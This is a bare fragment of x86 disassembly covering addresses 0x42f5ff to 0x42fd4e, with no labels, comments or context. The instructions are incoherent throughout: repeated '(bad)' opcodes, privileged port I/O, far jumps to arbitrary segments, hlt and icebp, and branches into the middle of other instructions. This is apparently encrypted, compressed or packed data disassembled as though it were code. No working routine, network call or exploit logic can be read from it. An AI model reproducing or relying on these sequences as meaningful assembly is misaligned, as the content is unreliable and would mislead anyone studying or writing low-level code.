  42f5ff:	cmp    bh,dl
  42f601:	stos   BYTE PTR es:[edi],al
  42f602:	fadd   DWORD PTR [ebp+0x10]
  42f605:	add    al,0xa6
  42f607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f608:	adc    al,0x6c
  42f60a:	mov    bh,0x1a
  42f60c:	jmp    0x2cfe:0xa09f190d
  42f613:	and    edi,DWORD PTR [eax+0x24480db5]
  42f619:	sti    
  42f61a:	dec    ebp
  42f61b:	outs   dx,BYTE PTR ds:[esi]
  42f61c:	pop    edx
  42f61d:	out    0x5e,eax
  42f61f:	mov    DWORD PTR [edx+0x7],ebp
  42f622:	mov    cl,0xc5
  42f624:	dec    esi
  42f625:	loope  0x42f600
  42f627:	(bad)
  42f62a:	lods   eax,DWORD PTR ds:[esi]
  42f62b:	pusha  
  42f62c:	mov    eax,ds:0xbf9bdf14
  42f631:	jmp    0x42f61e
  42f633:	push   edi
  42f634:	mov    bh,0x8e
  42f636:	fistp  WORD PTR [ecx+0x295f504d]
  42f63c:	into   
  42f63d:	xchg   edx,eax
  42f63e:	les    ebp,FWORD PTR [ebx-0x57]
  42f641:	lods   eax,DWORD PTR ds:[esi]
  42f642:	hlt    
  42f643:	jae    0x42f683
  42f645:	push   0x22cf3580
  42f64a:	pop    eax
  42f64b:	and    eax,0xe26dc403
  42f650:	into   
  42f651:	fs ins BYTE PTR es:[edi],dx
  42f653:	jb     0x42f697
  42f655:	pusha  
  42f656:	mov    ebx,0x56bb05d1
  42f65b:	leave  
  42f65c:	add    ah,BYTE PTR [ebp*4-0x149249fd]
  42f663:	add    cl,bh
  42f665:	mov    DWORD PTR fs:[ecx*2+0x6d8c6517],edi
  42f66d:	pop    ebx
  42f66e:	test   eax,0x25ccc5d8
  42f673:	bound  esi,QWORD PTR [edx]
  42f675:	push   ebx
  42f676:	into   
  42f677:	sub    bh,BYTE PTR [eax-0x58f4d350]
  42f67d:	push   es
  42f67e:	dec    ecx
  42f67f:	daa    
  42f680:	push   0x16
  42f682:	mov    dh,0x85
  42f684:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f685:	out    dx,eax
  42f686:	jle    0x42f65b
  42f688:	fiadd  DWORD PTR ds:0x1be8b823
  42f68e:	or     eax,0x5e7d9714
  42f693:	test   cl,bl
  42f695:	mov    dh,0xfc
  42f697:	mov    ds:0xa229adb6,al
  42f69c:	rcl    DWORD PTR [esi],0xef
  42f69f:	xchg   ebp,eax
  42f6a0:	fwait
  42f6a1:	sahf   
  42f6a2:	sbb    BYTE PTR [ebp+0x14],dh
  42f6a5:	fnsave [esi]
  42f6a7:	call   FWORD PTR [edx]
  42f6a9:	or     ebp,DWORD PTR [ebx+ebp*8-0x5f7e82f6]
  42f6b0:	in     eax,dx
  42f6b1:	mov    dl,0xdd
  42f6b3:	mov    eax,0x8492eae0
  42f6b8:	dec    esi
  42f6b9:	fist   DWORD PTR [esp+eax*8-0x4a]
  42f6bd:	sub    bh,BYTE PTR [eax-0x2a556dda]
  42f6c3:	lods   al,BYTE PTR ds:[esi]
  42f6c4:	dec    ebp
  42f6c5:	or     ebx,DWORD PTR [ebx-0x4b489f80]
  42f6cb:	adc    bh,BYTE PTR [ebx-0x24a9abe4]
  42f6d1:	or     cl,BYTE PTR [edx+0x26]
  42f6d4:	cmc    
  42f6d5:	cmp    eax,0x157634ec
  42f6da:	inc    ecx
  42f6db:	(bad)  
  42f6dc:	mov    bh,0x7e
  42f6de:	pop    edx
  42f6df:	ds js  0x42f6c0
  42f6e2:	imul   ebx,ebx,0x2e
  42f6e5:	mov    cl,BYTE PTR [ebx]
  42f6e7:	push   esi
  42f6e8:	cmp    ebx,0x2f
  42f6eb:	clc    
  42f6ec:	inc    esp
  42f6ed:	mov    DWORD PTR [ebp-0x2b],ecx
  42f6f0:	jbe    0x42f757
  42f6f2:	shr    DWORD PTR [eax+0x4d],1
  42f6f5:	shl    BYTE PTR [edi-0x7e809b10],cl
  42f6fb:	pop    ebx
  42f6fc:	les    eax,FWORD PTR [ebx+0x4e]
  42f6ff:	xchg   ecx,eax
  42f700:	or     al,0xfd
  42f702:	add    dh,ch
  42f704:	xchg   esp,eax
  42f705:	add    ah,bh
  42f707:	sub    bh,BYTE PTR [edx-0xff46b93]
  42f70d:	lds    edx,FWORD PTR [esi-0x63]
  42f710:	pushf  
  42f711:	sub    al,0xc4
  42f713:	adc    ah,al
  42f715:	and    ebx,esp
  42f717:	scas   al,BYTE PTR es:[edi]
  42f718:	imul   esp,DWORD PTR [eax],0x1f0b4b02
  42f71e:	adc    DWORD PTR [ecx-0x2c46834b],eax
  42f724:	arpl   WORD PTR [esi+0x5d],bp
  42f727:	inc    ecx
  42f728:	mov    ch,0x16
  42f72a:	sub    DWORD PTR [edi],eax
  42f72c:	sbb    dh,BYTE PTR [esi-0x5d712543]
  42f732:	xchg   esi,eax
  42f733:	mov    esp,0x95c2c266
  42f738:	xor    eax,0x16022d82
  42f73d:	fcom   QWORD PTR [ebx+ebp*1-0x55]
  42f741:	mov    cl,0x35
  42f743:	mov    BYTE PTR [esi],cl
  42f745:	mov    gs,WORD PTR [esi]
  42f747:	mov    ah,0x1d
  42f749:	call   0x43082d70
  42f74e:	push   ds
  42f74f:	mov    di,WORD PTR [ebp+0x375a37c9]
  42f756:	call   0xad5:0x95edffe7
  42f75d:	fist   DWORD PTR [eax+0x76a29bbd]
  42f763:	adc    eax,0xcd5f6127
  42f768:	dec    ebp
  42f769:	sub    eax,0x6c10d0b4
  42f76e:	mov    al,0xe3
  42f770:	inc    edi
  42f771:	dec    eax
  42f772:	jns    0x42f7d0
  42f774:	jge    0x42f72e
  42f776:	mov    cl,0xb1
  42f778:	jecxz  0x42f7cb
  42f77a:	pop    edx
  42f77b:	cmp    DWORD PTR [esi],eax
  42f77d:	jnp    0x42f770
  42f77f:	call   0x54790599
  42f784:	jno    0x42f727
  42f786:	push   cs
  42f787:	sub    BYTE PTR [ecx+0x3a1fd2a3],ah
  42f78d:	push   ebx
  42f78e:	lds    ebp,FWORD PTR [esi]
  42f790:	add    BYTE PTR [ecx-0x49],dl
  42f793:	arpl   WORD PTR [ecx+0x36],cx
  42f796:	xchg   esi,eax
  42f797:	or     ebx,DWORD PTR [ebx+0xf]
  42f79a:	cmp    edi,DWORD PTR [ebx-0x6f]
  42f79d:	mov    BYTE PTR [edi],dh
  42f79f:	sub    eax,esi
  42f7a1:	loopne 0x42f744
  42f7a3:	cmp    DWORD PTR [edx+0x2200e0d1],0x4ff98a66
  42f7ad:	(bad)  [esi-0x5ff495eb]
  42f7b3:	and    edx,DWORD PTR [esi+0x2a4d6de9]
  42f7b9:	mov    al,ds:0x5ca00eda
  42f7be:	pop    ds
  42f7bf:	xchg   esi,eax
  42f7c0:	adc    dl,bh
  42f7c2:	mov    dh,0xad
  42f7c4:	inc    ebp
  42f7c5:	xor    al,0x4b
  42f7c7:	popf   
  42f7c8:	pop    ecx
  42f7c9:	shr    BYTE PTR [eax-0x4f],0x6b
  42f7cd:	mov    ds:0x1741815b,al
  42f7d2:	aaa    
  42f7d3:	add    eax,0xd51aca0c
  42f7d8:	push   ecx
  42f7d9:	mov    al,0x71
  42f7db:	das    
  42f7dc:	rcl    ch,cl
  42f7de:	js     0x42f782
  42f7e0:	inc    ebp
  42f7e1:	rcl    BYTE PTR [eax],1
  42f7e3:	mov    edi,0x7bc846b8
  42f7e8:	lock pop ebx
  42f7ea:	jns    0x42f7ec
  42f7ec:	sbb    dh,dl
  42f7ee:	(bad)  
  42f7ef:	push   edx
  42f7f0:	mov    ebx,0xb324ac1f
  42f7f5:	pop    ss
  42f7f6:	jbe    0x42f782
  42f7f8:	(bad)
  42f7fc:	es loopne 0x42f809
  42f7ff:	repnz xor esp,edx
  42f802:	jno    0x42f7aa
  42f804:	mov    BYTE PTR [eax-0x417be02b],bh
  42f80a:	stos   DWORD PTR es:[edi],eax
  42f80b:	fldenv [esi]
  42f80d:	aad    0x76
  42f80f:	popa   
  42f810:	and    DWORD PTR [ebx],0xffffffa7
  42f813:	fnstenv ss:[edx]
  42f816:	vcmpss xmm3,xmm0,xmm3,0xb6
  42f81b:	aam    0x40
  42f81d:	fisub  WORD PTR [ebp+0x47]
  42f820:	mov    al,0x8c
  42f822:	hlt    
  42f823:	(bad)  
  42f824:	cmp    esi,DWORD PTR [esi+0x6b]
  42f827:	fwait
  42f828:	test   al,0xcb
  42f82a:	shl    bh,1
  42f82c:	das    
  42f82d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f82e:	dec    ebp
  42f82f:	in     al,dx
  42f830:	pop    ecx
  42f831:	xor    eax,0xd2b63617
  42f836:	hlt    
  42f837:	ret    0x20ce
  42f83a:	arpl   WORD PTR [ecx-0x3449025d],dx
  42f840:	(bad)  [esi+0x6b]
  42f843:	adc    ebp,ebx
  42f845:	shl    DWORD PTR ds:0xe566e95,cl
  42f84b:	add    BYTE PTR [ebx-0x64bf2a65],bh
  42f851:	sub    BYTE PTR [ecx-0x24],0x7c
  42f855:	bound  ebx,QWORD PTR [ecx+0x7d]
  42f858:	lods   eax,DWORD PTR ds:[esi]
  42f859:	mov    eax,DWORD PTR [ebp+0x6a31c446]
  42f85f:	cmp    al,0x82
  42f861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f862:	mov    ds:0xeeaa8bad,al
  42f867:	jnp    0x42f895
  42f869:	pop    ecx
  42f86a:	in     al,0x14
  42f86c:	ins    DWORD PTR es:[edi],dx
  42f86d:	adc    DWORD PTR ds:0xb0047366,eax
  42f873:	inc    ebp
  42f874:	mov    ah,0x4d
  42f876:	lea    edx,[ebx-0x51e6be2b]
  42f87c:	call   0xc88658a3
  42f881:	and    dl,dl
  42f883:	and    eax,0x5b1b5102
  42f888:	or     ebx,DWORD PTR [esi]
  42f88a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f88b:	scas   al,BYTE PTR es:[edi]
  42f88c:	aad    0x8a
  42f88e:	lods   eax,DWORD PTR ds:[esi]
  42f88f:	sub    al,0x6c
  42f891:	dec    ebx
  42f892:	jns    0x42f8b7
  42f894:	cwde   
  42f895:	test   al,0xc1
  42f897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f898:	push   cs
  42f899:	test   DWORD PTR [ebx+0x2ece85a9],ebx
  42f89f:	mov    WORD PTR [ebx],?
  42f8a1:	outs   dx,BYTE PTR ds:[esi]
  42f8a2:	inc    bl
  42f8a4:	inc    eax
  42f8a5:	je     0x42f8e8
  42f8a7:	ins    DWORD PTR es:[edi],dx
  42f8a8:	inc    eax
  42f8a9:	inc    ebx
  42f8aa:	push   ecx
  42f8ab:	jg     0x42f904
  42f8ad:	mov    al,0x1
  42f8af:	or     ch,BYTE PTR [esi+0x36]
  42f8b2:	loopne 0x42f8fa
  42f8b4:	inc    esi
  42f8b5:	sub    ecx,DWORD PTR [edi-0x5c9225ea]
  42f8bb:	add    DWORD PTR [ebx],esi
  42f8bd:	cmc    
  42f8be:	push   eax
  42f8bf:	add    ax,0x6756
  42f8c3:	shr    BYTE PTR [edx-0x53e8b435],1
  42f8c9:	fstp   QWORD PTR ds:0x2d001668
  42f8cf:	xor    ecx,DWORD PTR [eax+0x5b]
  42f8d2:	add    edx,ebp
  42f8d4:	cs aam 0x1f
  42f8d7:	push   ds
  42f8d8:	jp     0x42f897
  42f8da:	ret    0x1427
  42f8dd:	rol    DWORD PTR [esi],0xaa
  42f8e0:	test   DWORD PTR ds:0xb6dc4e13,esi
  42f8e6:	adc    dl,ah
  42f8e8:	cmc    
  42f8e9:	mov    ds:0xfb2708f9,eax
  42f8ee:	sub    al,0x17
  42f8f0:	sbb    ebx,DWORD PTR [ebx]
  42f8f2:	pop    ebp
  42f8f3:	push   esp
  42f8f4:	popf   
  42f8f5:	adc    eax,0x8921f0de
  42f8fa:	push   ebx
  42f8fb:	in     al,dx
  42f8fc:	stos   BYTE PTR es:[edi],al
  42f8fd:	cmp    BYTE PTR [ebp+0x640ca8a5],0x5
  42f904:	sbb    edi,DWORD PTR [ebx]
  42f906:	pusha  
  42f907:	ja     0x42f96f
  42f909:	iret   
  42f90a:	scas   eax,DWORD PTR es:[edi]
  42f90b:	call   0x475b:0xa2eb8233
  42f912:	scas   eax,DWORD PTR es:[edi]
  42f913:	jmp    0x42f8ef
  42f915:	fidivr DWORD PTR [esi-0x2988f17a]
  42f91b:	(bad)  
  42f91c:	shr    BYTE PTR [ebp+0x7c],cl
  42f91f:	in     al,dx
  42f920:	ror    DWORD PTR [edx+0x29],1
  42f923:	inc    eax
  42f924:	fs (bad) 
  42f926:	cmp    ch,ch
  42f928:	mov    ds:0x70f960,al
  42f92d:	aam    0x5
  42f92f:	clc    
  42f930:	int3   
  42f931:	nop
  42f932:	add    edi,DWORD PTR [edx-0x3efe27fe]
  42f938:	add    BYTE PTR [edi],bh
  42f93a:	push   0x7685d438
  42f93f:	fistp  DWORD PTR ds:0x915b0e32
  42f945:	mov    bl,0x4
  42f947:	cmp    esi,edi
  42f949:	dec    ebp
  42f94a:	jo     0x42f8f5
  42f94c:	pop    esp
  42f94d:	fsub   st,st(0)
  42f94f:	or     al,0xf3
  42f951:	lods   eax,DWORD PTR ds:[esi]
  42f952:	sbb    eax,0x80a0e858
  42f957:	js     0x42f8e9
  42f959:	add    edx,DWORD PTR [eax]
  42f95b:	or     dl,al
  42f95d:	mov    dh,0xbc
  42f95f:	frstor [edi]
  42f961:	fmul   st,st(7)
  42f963:	push   0x6123000e
  42f968:	pop    edi
  42f969:	iret   
  42f96a:	jo     0x42f920
  42f96c:	mov    ds:0x9e04e00e,al
  42f971:	outs   dx,BYTE PTR ds:[esi]
  42f972:	jg     0x42f965
  42f974:	shl    DWORD PTR [esi+0x620a2ea3],cl
  42f97a:	fistp  QWORD PTR [edx-0x7f2bc77a]
  42f980:	mov    eax,ds:0xe89b144d
  42f985:	mov    ch,0x15
  42f987:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f989:	xor    al,0x35
  42f98b:	add    DWORD PTR ds:[ecx-0x3c5957ff],esi
  42f992:	dec    edi
  42f993:	arpl   WORD PTR [esi+0xe35baa1],si
  42f999:	inc    eax
  42f99a:	sbb    dl,ah
  42f99c:	arpl   WORD PTR [ecx-0x57],bx
  42f99f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f9a0:	sahf   
  42f9a1:	push   0xffffffe1
  42f9a3:	push   esi
  42f9a4:	mov    cl,BYTE PTR [esi+0x4697682c]
  42f9aa:	test   al,0x10
  42f9ac:	pop    ss
  42f9ad:	jmp    0x5831:0x8c7a18a2
  42f9b4:	add    DWORD PTR [edi],edx
  42f9b6:	mov    BYTE PTR [edx+edx*8],cl
  42f9b9:	cld    
  42f9ba:	mov    bh,0x4e
  42f9bc:	push   0x2
  42f9be:	fiadd  DWORD PTR [ebp+0x79]
  42f9c1:	(bad)  
  42f9c2:	jl     0x42f97e
  42f9c4:	sbb    al,0xb0
  42f9c6:	jne    0x42fa08
  42f9c8:	(bad)  [ebx]
  42f9ca:	push   edi
  42f9cb:	hlt    
  42f9cc:	dec    esi
  42f9cd:	loop   0x42fa16
  42f9cf:	add    DWORD PTR [esi],esi
  42f9d1:	push   edi
  42f9d2:	mov    ebx,0xb06ef4b4
  42f9d7:	shr    BYTE PTR [esi+0x7d],1
  42f9da:	std    
  42f9db:	dec    ebp
  42f9dc:	dec    ebx
  42f9dd:	ss adc al,0xdd
  42f9e0:	push   ss
  42f9e1:	cli    
  42f9e2:	mov    eax,ds:0x11aaa80b
  42f9e7:	les    edx,FWORD PTR [edx-0x65]
  42f9ea:	and    bh,BYTE PTR [edx+0x5dd41c15]
  42f9f0:	clc    
  42f9f1:	dec    ecx
  42f9f2:	je     0x42fa2a
  42f9f4:	add    BYTE PTR [esi+0x16fd555d],dh
  42f9fa:	jmp    0x35fe340a
  42f9ff:	mov    BYTE PTR [esi],ah
  42fa01:	scas   eax,DWORD PTR es:[edi]
  42fa02:	or     BYTE PTR [eax+0x29166511],ch
  42fa08:	ins    DWORD PTR es:[edi],dx
  42fa09:	jmp    0x42fa35
  42fa0b:	push   0x8c901dd3
  42fa10:	in     eax,0xe
  42fa12:	fcmovnbe st,st(6)
  42fa14:	mov    al,ds:0x24314c85
  42fa19:	jns    0x42fa3b
  42fa1b:	inc    esi
  42fa1c:	mov    bl,0x87
  42fa1e:	mov    bh,0xad
  42fa20:	sub    esp,DWORD PTR [eax-0x760259c8]
  42fa26:	nop
  42fa27:	imul   ebp,eax,0xffffffe9
  42fa2a:	std    
  42fa2b:	push   0x17
  42fa2d:	push   ebp
  42fa2e:	jb     0x42fa16
  42fa30:	jl     0x42f9ee
  42fa32:	xchg   DWORD PTR [eax+0xb],esp
  42fa35:	pop    ebx
  42fa36:	mov    eax,ds:0x68f61d28
  42fa3b:	int3   
  42fa3c:	dec    ecx
  42fa3d:	add    ebp,DWORD PTR [ebp+0x20]
  42fa40:	cs mov ah,0x64
  42fa43:	mov    edx,?
  42fa45:	and    DWORD PTR [edi+0x1befbd58],0x3d6d405d
  42fa4f:	add    al,0xa5
  42fa51:	mov    bl,0x3c
  42fa53:	xchg   edi,eax
  42fa54:	fidiv  DWORD PTR [esi]
  42fa56:	inc    ebx
  42fa57:	dec    ebx
  42fa58:	cwde   
  42fa59:	pop    eax
  42fa5a:	lods   eax,DWORD PTR ds:[esi]
  42fa5b:	cmp    bh,bh
  42fa5d:	mov    bl,0x14
  42fa5f:	push   edi
  42fa60:	ins    DWORD PTR es:[edi],dx
  42fa61:	aaa    
  42fa62:	pop    eax
  42fa63:	push   esi
  42fa64:	or     BYTE PTR [edx-0x3a],0x1e
  42fa68:	mov    WORD PTR ds:0x6e800e52,gs
  42fa6e:	ins    DWORD PTR es:[edi],dx
  42fa6f:	shl    BYTE PTR [eax],1
  42fa71:	xchg   BYTE PTR [edx+0x57],ah
  42fa74:	push   0x8d85c491
  42fa79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa7a:	mov    al,ds:0xbf42c3ec
  42fa7f:	not    DWORD PTR [ebx-0x57]
  42fa82:	pop    ebp
  42fa83:	sub    al,0x34
  42fa85:	inc    ebp
  42fa86:	xlat   BYTE PTR ds:[ebx]
  42fa87:	push   esp
  42fa88:	jo     0x42fa4f
  42fa8a:	mov    bh,0xb9
  42fa8c:	outs   dx,BYTE PTR ds:[esi]
  42fa8d:	test   DWORD PTR [edx+0x1b],ebp
  42fa90:	scas   al,BYTE PTR es:[edi]
  42fa91:	pop    edx
  42fa92:	pop    ecx
  42fa93:	jns    0x42fab2
  42fa95:	fidiv  DWORD PTR [ecx-0x2ffd393c]
  42fa9b:	add    eax,0x18ab0acc
  42faa0:	mov    ebx,0x991d0bfc
  42faa5:	and    BYTE PTR [edx-0xbff21cd],bl
  42faab:	repz add BYTE PTR [eax+0x6b],cl
  42faaf:	adc    al,0x3b
  42fab1:	mov    ah,0x83
  42fab3:	stos   BYTE PTR es:[edi],al
  42fab4:	gs shl edx,0xe0
  42fab8:	cmp    DWORD PTR [eax+edx*8-0x59af8a92],esp
  42fabf:	repnz add BYTE PTR [ecx],0xda
  42fac3:	mov    eax,ds:0x5b0144d
  42fac8:	or     bl,ch
  42faca:	adc    BYTE PTR [edi],0xdc
  42facd:	push   0x2017b510
  42fad2:	mov    WORD PTR [ebx+0x77],cs
  42fad5:	fcom   QWORD PTR [eax-0x3c]
  42fad8:	lea    ebp,[ebp-0x1033283]
  42fade:	jno    0x42fb0e
  42fae0:	mov    al,ds:0x85b5d6ed
  42fae5:	adc    al,0x80
  42fae7:	xchg   BYTE PTR [eax+0x5e],dl
  42faea:	clc    
  42faeb:	add    BYTE PTR [edi-0x5a0a7e8a],dh
  42faf1:	ins    BYTE PTR es:[edi],dx
  42faf2:	loopne 0x42fab0
  42faf4:	push   ebx
  42faf5:	(bad)  
  42faf6:	or     eax,0x76006a6
  42fafb:	cmc    
  42fafc:	out    0x14,al
  42fafe:	xchg   esp,esp
  42fb00:	(bad)  
  42fb01:	in     eax,dx
  42fb02:	(bad)  
  42fb03:	ss mov dh,0x9f
  42fb06:	and    DWORD PTR [ecx-0x3494bc0a],0x74
  42fb0d:	jg     0x42fb5c
  42fb0f:	mov    ebx,0x176db855
  42fb14:	data16 mov al,0x46
  42fb17:	in     al,dx
  42fb18:	shr    DWORD PTR [ebp-0x31],0x45
  42fb1c:	repnz call 0x59ce:0xd66db608
  42fb24:	pop    edi
  42fb25:	shl    DWORD PTR [edx-0x2eea5c32],cl
  42fb2b:	add    dh,BYTE PTR [ecx-0x1d59c956]
  42fb31:	mov    BYTE PTR [edx+0x3fff27d3],0x5a
  42fb38:	jl     0x42fb0c
  42fb3a:	inc    edx
  42fb3b:	push   edi
  42fb3c:	shl    DWORD PTR [eax+edx*8],1
  42fb3f:	xchg   edx,eax
  42fb40:	fmul   st(2),st
  42fb42:	int3   
  42fb43:	sbb    bh,BYTE PTR [ecx+eiz*4+0x11]
  42fb47:	fucomi st,st(3)
  42fb49:	inc    ecx
  42fb4a:	add    al,0xbc
  42fb4c:	add    DWORD PTR [edi],ebp
  42fb4e:	scas   eax,DWORD PTR es:[edi]
  42fb4f:	add    BYTE PTR [edx],bl
  42fb51:	inc    esp
  42fb52:	mov    ebx,0xc51fb6d1
  42fb57:	and    ebx,DWORD PTR [esi+0x3c]
  42fb5a:	jmp    0x42fb4e
  42fb5c:	dec    ebx
  42fb5d:	fcomi  st,st(6)
  42fb5f:	add    eax,0x6c084e70
  42fb64:	xchg   edx,eax
  42fb65:	sub    esp,DWORD PTR [edx+eax*8+0x6c012aa0]
  42fb6c:	or     BYTE PTR [esi+0x53],dl
  42fb6f:	ret    0x28a6
  42fb72:	fdivr  DWORD PTR [ecx+0x2b]
  42fb75:	jns    0x42fb2e
  42fb77:	pop    ebx
  42fb78:	pop    es
  42fb79:	test   al,0xe5
  42fb7b:	adc    esi,DWORD PTR [edi-0x6522e41d]
  42fb81:	popa   
  42fb82:	test   edx,ebx
  42fb84:	pop    ebx
  42fb85:	inc    ebx
  42fb86:	mov    al,0x81
  42fb88:	adc    edx,DWORD PTR [esi]
  42fb8a:	pop    ebp
  42fb8c:	popa   
  42fb8d:	sbb    bh,BYTE PTR [esi]
  42fb8f:	push   esp
  42fb90:	mov    ah,0x9
  42fb92:	mov    BYTE PTR [ebp-0x23],cl
  42fb95:	adc    ebx,DWORD PTR [edi-0x8]
  42fb98:	pop    eax
  42fb99:	fdiv   DWORD PTR [esi]
  42fb9b:	jg     0x42fbb4
  42fb9d:	cld    
  42fb9e:	pop    esp
  42fb9f:	mov    ds:0x15b7086a,al
  42fba4:	sbb    ecx,DWORD PTR ds:0xbe48dc10
  42fbaa:	adc    dh,BYTE PTR [esi-0x4543ffde]
  42fbb0:	ins    DWORD PTR es:[edi],dx
  42fbb1:	dec    edi
  42fbb2:	je     0x42fbdd
  42fbb4:	lea    ebx,[ebx-0x19]
  42fbb7:	out    0x69,al
  42fbb9:	add    al,ch
  42fbbb:	cmp    DWORD PTR [esi],esp
  42fbbd:	and    BYTE PTR [eax-0x28],bl
  42fbc0:	and    cl,ch
  42fbc2:	sbb    DWORD PTR [esi],ebp
  42fbc4:	inc    ebp
  42fbc5:	cld    
  42fbc6:	inc    edx
  42fbc7:	push   edi
  42fbc8:	aad    0xbb
  42fbca:	dec    ecx
  42fbcb:	jae    0x42fc0c
  42fbcd:	test   eax,0x7d005562
  42fbd2:	pop    ds
  42fbd3:	ss push ss
  42fbd5:	fidiv  DWORD PTR [esi-0xa6bfdae]
  42fbdb:	loop   0x42fc26
  42fbdd:	daa    
  42fbde:	sub    BYTE PTR [ebp+0xd],dl
  42fbe1:	jne    0x42fbbe
  42fbe3:	sbb    eax,0xbf19985c
  42fbe8:	popf   
  42fbe9:	or     al,bl
  42fbeb:	add    eax,0x23ab2b71
  42fbf0:	sub    ch,dl
  42fbf2:	jne    0x42fc3f
  42fbf4:	jp     0x42fc18
  42fbf6:	sbb    bl,BYTE PTR [ebx-0x75109600]
  42fbfc:	or     ebx,ecx
  42fbfe:	mov    bh,0x85
  42fc00:	das    
  42fc01:	cwde   
  42fc02:	(bad)  
  42fc03:	aaa    
  42fc04:	outs   dx,BYTE PTR ds:[esi]
  42fc05:	inc    esp
  42fc06:	push   edi
  42fc07:	out    dx,al
  42fc08:	add    BYTE PTR [ebp+ebx*2-0x29],bl
  42fc0c:	(bad)  
  42fc0d:	aad    0x89
  42fc0f:	pop    edx
  42fc10:	dec    esp
  42fc11:	adc    DWORD PTR [edx-0x2f051af5],0x44
  42fc18:	add    BYTE PTR [ebx-0x3c],bl
  42fc1b:	jecxz  0x42fc75
  42fc1d:	scas   al,BYTE PTR es:[edi]
  42fc1e:	push   ebx
  42fc1f:	push   ebx
  42fc20:	les    eax,FWORD PTR [edx-0x4b]
  42fc23:	addr16 xor al,cl
  42fc26:	in     eax,dx
  42fc27:	neg    BYTE PTR [edx+0x68]
  42fc2a:	sub    ah,BYTE PTR [edx+0x5e]
  42fc2d:	nop
  42fc2e:	adc    al,0x3c
  42fc30:	fcomp  QWORD PTR [esi]
  42fc32:	sbb    esi,DWORD PTR [ebp-0x1fc275ac]
  42fc38:	sbb    dl,BYTE PTR [edi+ebp*8+0x55]
  42fc3c:	pop    esp
  42fc3d:	fisubr DWORD PTR [edx-0x2f]
  42fc40:	jg     0x42fc6b
  42fc42:	inc    ecx
  42fc43:	xor    ebx,DWORD PTR [esi+0x762a8edb]
  42fc49:	orps   xmm6,XMMWORD PTR [ebx+ecx*1+0x2c]
  42fc4e:	test   BYTE PTR [eax+0x540d8876],dh
  42fc54:	ins    DWORD PTR es:[edi],dx
  42fc55:	dec    ebp
  42fc56:	hlt    
  42fc57:	stc    
  42fc58:	fild   QWORD PTR [eax+0x6e]
  42fc5b:	and    eax,0x3d8da6a2
  42fc60:	adc    edi,DWORD PTR [edx-0x57]
  42fc63:	in     al,0xff
  42fc65:	push   esi
  42fc66:	in     eax,dx
  42fc67:	(bad)  
  42fc68:	add    eax,0x384c5220
  42fc6d:	ja     0x42fc49
  42fc6f:	rol    BYTE PTR [eax],cl
  42fc71:	imul   ecx,DWORD PTR [edx],0x5d058600
  42fc77:	add    BYTE PTR [edx+esi*1],dh
  42fc7a:	pop    edx
  42fc7b:	in     al,0x56
  42fc7d:	pop    ss
  42fc7e:	push   eax
  42fc7f:	dec    ebx
  42fc80:	push   esi
  42fc81:	cmp    BYTE PTR [eax+0xb8255d6],ch
  42fc87:	dec    ebx
  42fc88:	fisttp DWORD PTR [ecx]
  42fc8a:	das    
  42fc8b:	sub    DWORD PTR [ecx-0xf],esi
  42fc8e:	adc    BYTE PTR [ebx],dl
  42fc90:	push   es
  42fc91:	xor    eax,0xee21b551
  42fc96:	pop    esi
  42fc97:	push   es
  42fc98:	add    al,0x64
  42fc9a:	push   ss
  42fc9b:	cmp    al,BYTE PTR [edx-0x5c8f146]
  42fca1:	mov    ebx,0xdb77be20
  42fca6:	add    al,BYTE PTR [ebp+0x3b9690a2]
  42fcac:	ficom  DWORD PTR [ebx]
  42fcae:	pop    eax
  42fcaf:	pop    edx
  42fcb0:	sub    BYTE PTR ds:0xfb2d1cff,al
  42fcb6:	ret    0x75ba
  42fcb9:	adc    DWORD PTR [ebp+0x55],ebx
  42fcbc:	push   cs
  42fcbd:	mov    esp,esp
  42fcbf:	or     BYTE PTR [ebx],cl
  42fcc1:	out    dx,eax
  42fcc2:	mov    al,ds:0xa8ed101d
  42fcc7:	mov    ch,BYTE PTR [edx+0x1bb4486c]
  42fccd:	or     esp,ebp
  42fccf:	add    bh,BYTE PTR [eax-0x34]
  42fcd2:	and    ebp,DWORD PTR [ebx+ebp*1+0x2d540339]
  42fcd9:	inc    ebp
  42fcda:	sbb    ebx,DWORD PTR [ebp-0x20]
  42fcdd:	imul   ebx,DWORD PTR [edx],0x6
  42fce0:	add    BYTE PTR [esi+0x34],ch
  42fce3:	add    al,0x37
  42fce5:	outs   dx,DWORD PTR ds:[esi]
  42fce6:	sbb    al,0x5f
  42fce8:	mov    bh,0xa
  42fcea:	fadd   DWORD PTR [eax+eax*8-0x5c]
  42fcee:	adc    eax,0x75d56f5f
  42fcf3:	push   esp
  42fcf4:	ror    BYTE PTR [esi-0x3a7c1b4a],0xab
  42fcfb:	push   ss
  42fcfc:	sbb    ch,BYTE PTR [ebp+0x33]
  42fcff:	xor    dl,BYTE PTR [ecx]
  42fd01:	and    eax,0xdb97e8fe
  42fd06:	push   edi
  42fd07:	adc    BYTE PTR [ebx-0x7c6941f6],bh
  42fd0d:	push   edi
  42fd0e:	sub    DWORD PTR [edx-0x5],0xffffffd5
  42fd12:	in     eax,dx
  42fd13:	retf   
  42fd14:	les    edx,FWORD PTR [ebp-0x4f92c7bc]
  42fd1a:	xor    eax,0xecd3b445
  42fd1f:	icebp  
  42fd20:	test   eax,0xad839795
  42fd25:	stos   DWORD PTR es:[edi],eax
  42fd26:	mov    eax,0x12b5e50a
  42fd2b:	sahf   
  42fd2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fd2d:	not    DWORD PTR [ebx-0x58]
  42fd30:	sbb    eax,0x7f187001
  42fd35:	cwde   
  42fd36:	xor    ebx,DWORD PTR [esi]
  42fd38:	jo     0x42fd15
  42fd3a:	pop    edx
  42fd3b:	jmp    0x6d0:0x5a26964b
  42fd42:	sub    al,0xab
  42fd44:	dec    BYTE PTR [eax+0x1c145d0b]
  42fd4a:	aas    
  42fd4b:	adc    BYTE PTR [edx-0x23],ch
  42fd4e:	adc    edx,ecx
